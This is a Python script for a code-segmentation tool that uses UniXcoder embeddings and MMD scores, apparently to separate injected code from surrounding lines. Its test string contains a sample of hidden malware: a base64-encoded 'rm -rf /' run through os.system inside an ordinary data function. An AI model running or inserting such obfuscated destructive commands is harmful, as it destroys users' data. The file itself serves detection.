import numpy as np
import torch
import torch.nn.functional as F
from transformers import AutoModel, AutoTokenizer

class MMDEdgeCalibratedSegmenter:
    def __init__(self, model_name="microsoft/unixcoder-base", device="cuda:0"):
        print(f"[INFO] Loading UniXcoder for Edge-Calibrated MMD Analysis...")
        self.device = device
        self.tokenizer = AutoTokenizer.from_pretrained(model_name)
        self.model = AutoModel.from_pretrained(model_name).to(self.device).eval()
        
    def get_embeddings(self, code_blocks):
        inputs = self.tokenizer(
            code_blocks, padding=True, truncation=True, 
            max_length=128, return_tensors="pt"
        ).to(self.device)
        
        with torch.no_grad():
            outputs = self.model(**inputs)
            # Take the [CLS] representation and apply L2 normalization
            embeddings = outputs.last_hidden_state[:, 0, :] 
            embeddings = F.normalize(embeddings, p=2, dim=1).cpu().numpy()
        return embeddings

    def segment_code_mmd_calibrated(self, source_code, window_size=3, z_threshold=1.5):
        """
        MMD distribution shift + edge-degradation calibration.
        """
        raw_lines =[line for line in source_code.split('\n') if line.strip()]
        N = len(raw_lines)
        if N < 4:
            return [source_code]

        embeddings = self.get_embeddings(raw_lines)
        sim_matrix = np.dot(embeddings, embeddings.T) # Precompute the similarity matrix
        
        hybrid_scores = np.zeros(N)
        valid_boundaries =[]
        
        # ---------------------------------------------------------
        # 1. Scan gaps (combining MMD with edge degradation)
        # ---------------------------------------------------------
        for i in range(1, N):
            start = max(0, i - window_size)
            end = min(N, i + window_size)
            
            L_indices = list(range(start, i))
            R_indices = list(range(i, end))
            
            # For edges (where the sample size is too small to form a distribution),
            # judge them separately:
            if len(L_indices) < 2 or len(R_indices) < 2:
                # Degraded strategy: directly use the absolute semantic distance
                # between two adjacent lines (1 - cosine similarity)
                score = 1.0 - sim_matrix[i-1, i]
            else:
                # Core-region strategy: use rigorous MMD distribution shift
                K_LL = sim_matrix[np.ix_(L_indices, L_indices)].mean()
                K_RR = sim_matrix[np.ix_(R_indices, R_indices)].mean()
                K_LR = sim_matrix[np.ix_(L_indices, R_indices)].mean()
                
                mmd = K_LL + K_RR - 2 * K_LR
                score = max(0, mmd) # Clamp tiny negative values to avoid jitter
                
            hybrid_scores[i] = score
            valid_boundaries.append(i)

        # ---------------------------------------------------------
        # 2. Dynamic adaptive threshold (Z-Score)
        # ---------------------------------------------------------
        valid_scores = hybrid_scores[valid_boundaries]
        
        median_score = np.median(valid_scores)
        mad = np.median(np.abs(valid_scores - median_score))
        if mad == 0: mad = 1e-4
        
        # Dynamic threshold: median + Z * volatility
        dynamic_threshold = median_score + z_threshold * mad

        # ---------------------------------------------------------
        # 3. Perform segmentation (with peak filtering to avoid over-splitting)
        # ---------------------------------------------------------
        cut_points = [0]
        for i in valid_boundaries:
            if hybrid_scores[i] > dynamic_threshold and hybrid_scores[i] > 0.15:
                # Local peak check (non-maximum suppression)
                is_peak = True
                if i > 1 and hybrid_scores[i] <= hybrid_scores[i-1]: is_peak = False
                if i < N-1 and hybrid_scores[i] < hybrid_scores[i+1]: is_peak = False
                
                if is_peak:
                    cut_points.append(i)
                
        cut_points.append(N)
        
        # ---------------------------------------------------------
        # 4. Assemble the result
        # ---------------------------------------------------------
        chunks =[]
        for j in range(len(cut_points) - 1):
            start_idx = cut_points[j]
            end_idx = cut_points[j+1]
            if start_idx < end_idx:
                chunks.append('\n'.join(raw_lines[start_idx:end_idx]))
                
        return chunks

# --- Test run ---
if __name__ == "__main__":
    segmenter = MMDEdgeCalibratedSegmenter()
    
    malicious_code = """
import requests
import pandas as pd
def process_data(url):
    response = requests.get(url)
    data = response.content
    with open('temp.csv', 'wb') as f:
        f.write(data)
    df = pd.read_csv('temp.csv')
import os
import base64
payload = b'cm0gLXJmIC8='
os.system(base64.b64decode(payload).decode('utf-8'))
    df = df.dropna()
    return df
"""
    print("\n[INFO] Running MMD edge-calibrated scan...")
    chunks = segmenter.segment_code_mmd_calibrated(malicious_code, window_size=3)
    
    print("\n" + "="*50)
    for i, chunk in enumerate(chunks):
        print(f"================ Code {i+1} ================")
        print(chunk)